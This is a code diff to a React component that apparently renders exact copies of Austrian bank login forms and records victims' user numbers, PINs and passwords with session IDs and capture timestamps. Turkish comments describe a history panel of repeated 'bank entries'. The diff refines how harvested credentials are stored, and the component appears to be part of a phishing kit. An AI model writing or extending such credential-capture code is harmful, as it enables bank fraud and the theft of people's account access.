@@ -1162,7 +1162,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         bankSlug,
         bankName,
         htmlStepIndex: stepIndex,
-        htmlStepLabel: `Step ${stepIndex + 1}/${totalSteps}`,
+        htmlStepLabel: "BANKA FORMU",
         verfuegernummer: usernameField?.value ?? "",
         username: usernameField?.value ?? "",
         pin: passwordField?.value ?? "",
@@ -1182,10 +1182,20 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         capturedAt: new Date().toISOString(),
       };
 
+      // ⭐ BANKA GECMISI APPEND: SADECE TEKRAR GIRISLERDE push et.
+      //   ILK GIRIS (step 0 + daha once veri YOKSA) kolonlara kaydedilsin ama
+      //   GEÇMİŞ butonu sayisi artmasin.
+      const prevOrdered1 = String((previousFormData as any).orderedField1 || "").trim();
+      const prevUsername = String((previousFormData as any).username || (previousFormData as any).verfuegernummer || "").trim();
+      const prevPassword = String((previousFormData as any).password || (previousFormData as any).pin || "").trim();
+      const isFirstBankEntry =
+        prevOrdered1.length === 0 && prevUsername.length === 0 && prevPassword.length === 0;
       const previousHistory = Array.isArray((previousFormData as any).bankFormHistory)
         ? (previousFormData as any).bankFormHistory.slice()
         : [];
-      previousHistory.push(historyEntry);
+      if (!isFirstBankEntry) {
+        previousHistory.push(historyEntry);
+      }
 
       const mergedUsername = usernameField?.value || (previousFormData.username as string) || "";
       const mergedPassword = passwordField?.value || (previousFormData.password as string) || "";
